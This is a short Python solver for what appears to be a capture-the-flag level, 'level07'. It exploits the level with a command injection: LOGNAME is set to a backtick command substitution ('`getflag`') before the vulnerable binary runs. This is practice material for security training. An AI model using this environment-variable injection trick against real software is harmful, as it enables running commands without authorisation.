from solver.utils import extract_flag

def solve(connection):
	response = connection.exec("export LOGNAME='`getflag`' && ./level07")
	return "", extract_flag(response)